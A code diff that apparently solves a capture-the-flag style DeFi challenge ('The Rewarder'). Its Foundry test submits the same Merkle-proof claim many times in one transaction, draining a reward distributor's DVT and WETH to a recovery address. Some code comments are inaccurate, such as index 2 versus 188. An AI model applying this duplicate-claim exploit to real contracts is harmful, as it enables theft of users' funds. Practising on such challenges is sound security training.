@@ -148,40 +148,50 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
-    }
-
-    function test_sabotage() public {
-        vm.startPrank(player);
-        uint256 initialRemainingDVT = distributor.getRemaining(address(dvt));
-        uint256 claimAmount = 11524763827831882;
-        uint256 numClaims = initialRemainingDVT / claimAmount; // Number of claims to make
-
         bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
         bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
 
-        // DVT:
-        IERC20[] memory tokensToClaim = new IERC20[](1);
+        IERC20[] memory tokensToClaim = new IERC20[](2);
         tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
 
-        Claim[] memory claims = new Claim[](numClaims);
+        // DVT:
+        uint256 initialRemainingDVT = distributor.getRemaining(address(dvt));
+        uint256 dvtClaimAmount = 11524763827831882;
+        uint256 numDvtClaims = initialRemainingDVT / dvtClaimAmount; // Number of claims to make
 
-        Claim memory claim = Claim({
+        Claim memory dvtClaim = Claim({
             batchNumber: 0, // claim corresponds to first DVT batch
-            amount: claimAmount,
+            amount: dvtClaimAmount,
             tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
-            proof: merkle.getProof(dvtLeaves, 188) // Alice's address is at index 2
+            proof: merkle.getProof(dvtLeaves, 188) // Player's address is at index 2
         });
 
-        for (uint256 i = 0; i < numClaims; i++) {
-            claims[i] = claim;
+        // WETH
+        uint256 initialRemainingWeth = distributor.getRemaining(address(weth));
+        uint256 wethClaimAmount = 1171088749244340;
+        uint256 numWethClaims = initialRemainingWeth / wethClaimAmount; // Number of claims to make
+
+        Claim memory wethClaim = Claim({
+            batchNumber: 0, // claim corresponds to first DVT batch
+            amount: wethClaimAmount,
+            tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
+            proof: merkle.getProof(wethLeaves, 188) // Player's address is at index 2
+        });
+
+        // Construct tx
+        Claim[] memory claims = new Claim[](numDvtClaims + numWethClaims);
+        for (uint256 i = 0; i < numDvtClaims; i++) {
+            claims[i] = dvtClaim;
+        }
+        for (uint256 i = numDvtClaims; i < numDvtClaims + numWethClaims; i++) {
+            claims[i] = wethClaim;
         }
 
         distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
-        vm.stopPrank();
 
-        uint256 remainingDVT = distributor.getRemaining(address(dvt));
-        assertEq(remainingDVT, initialRemainingDVT - claimAmount * numClaims, "Remaining DVT amount mismatch");
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
